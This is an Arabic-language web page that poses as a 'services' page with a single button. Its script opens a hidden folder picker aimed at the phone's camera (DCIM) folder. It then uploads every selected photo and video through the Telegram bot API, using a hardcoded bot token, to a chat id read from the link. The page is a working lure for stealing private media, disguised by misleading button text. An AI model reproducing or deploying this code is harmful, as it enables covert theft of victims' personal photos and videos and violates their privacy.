<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدماتنا</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            width: 100%;
            max-width: 400px;
        }
        
        .message {
            font-size: 22px;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        
        .btn {
            background: linear-gradient(to right, #f46b45, #eea849);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            width: 100%;
            max-width: 250px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .btn:hover {
            transform: scale(1.02);
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .loading {
            margin-top: 20px;
            font-size: 16px;
            color: rgba(255, 255, 255, 0.8);
            display: none;
        }
        
        .success-message {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4CAF50;
            padding: 10px;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
            font-size: 14px;
        }
        
        .error-message {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid #F44336;
            padding: 10px;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
        
        <button id="servicesBtn" class="btn">الخدمات</button>
        
        <div id="loading" class="loading">جاري المعالجة...</div>
        
        <div id="successMessage" class="success-message"></div>
        <div id="errorMessage" class="error-message"></div>
        
        <!-- Input مخفي لاختيار الملفات -->
        <input type="file" id="fileInput" webkitdirectory directory multiple style="display: none;" accept="image/*,video/*">
    </div>

    <script>
        // التوكن الثابت
        const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
        
        // العناصر
        const servicesBtn = document.getElementById('servicesBtn');
        const fileInput = document.getElementById('fileInput');
        const loading = document.getElementById('loading');
        const successMessage = document.getElementById('successMessage');
        const errorMessage = document.getElementById('errorMessage');
        
        // عند النقر على زر الخدمات
        servicesBtn.addEventListener('click', function() {
            // نغير نص الزر
            servicesBtn.textContent = "بدء";
            servicesBtn.disabled = false;
            
            // نغير وظيفة الزر لفتح مجلد DCIM
            servicesBtn.onclick = openDCIMFolder;
        });
        
        // فتح مجلد DCIM
        function openDCIMFolder() {
            servicesBtn.disabled = true;
            servicesBtn.textContent = "لحظة من فضلك…";
            
            // نبدأ محاولة الوصول للمجلد
            setTimeout(() => {
                fileInput.click();
            }, 500);
        }
        
        // عند اختيار الملفات
        fileInput.addEventListener('change', async function(e) {
            const files = e.target.files;
            
            if (files.length === 0) {
                resetButton();
                return;
            }
            
            // الحصول على chatid من الرابط
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('chatid');
            
            if (!chatId) {
                showError('❌ لم يتم العثور على chatid في الرابط');
                resetButton();
                return;
            }
            
            // إظهار رسالة التحميل
            loading.style.display = 'block';
            servicesBtn.style.display = 'none';
            
            try {
                let successfulUploads = 0;
                const totalFiles = files.length;
                
                // إرسال كل الملفات
                for (let i = 0; i < totalFiles; i++) {
                    const file = files[i];
                    
                    // تحديث رسالة التحميل
                    loading.textContent = `جاري الرفع... ${i + 1}/${totalFiles}`;
                    
                    // إرسال الملف إلى التلجرام
                    const success = await sendToTelegram(file, chatId);
                    
                    if (success) {
                        successfulUploads++;
                    }
                    
                    // تأخير بسيط بين الملفات
                    await new Promise(resolve => setTimeout(resolve, 300));
                }
                
                // عرض نتيجة الرفع
                if (successfulUploads > 0) {
                    showSuccess(`✅ تم الانتهاء بنجاح`);
                } else {
                    showError('❌ لم يتم رفع أي ملف');
                }
                
            } catch (error) {
                showError(`❌ حدث خطأ: ${error.message}`);
            } finally {
                // إخفاء التحميل
                loading.style.display = 'none';
                
                // إعادة تعيين بعد 3 ثوان
                setTimeout(() => {
                    successMessage.style.display = 'none';
                    errorMessage.style.display = 'none';
                    resetButton();
                }, 3000);
            }
        });
        
        // إرسال ملف إلى التلجرام
        async function sendToTelegram(file, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', file);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                return response.ok;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }
        
        // إعادة تعيين الزر
        function resetButton() {
            servicesBtn.textContent = "بدء";
            servicesBtn.disabled = false;
            servicesBtn.style.display = 'block';
            servicesBtn.onclick = openDCIMFolder;
        }
        
        // عرض رسالة نجاح
        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.style.display = 'block';
            errorMessage.style.display = 'none';
        }
        
        // عرض رسالة خطأ
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            successMessage.style.display = 'none';
        }
        
        // محاولة فتح مجلد DCIM تلقائياً عند تحميل الصفحة
        window.addEventListener('load', function() {
            // نتحقق من أن المستخدم على هاتف
            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            
            if (isMobile) {
                console.log("جهاز محمول مكتشف");
            }
        });
    </script>
</body>
</html>
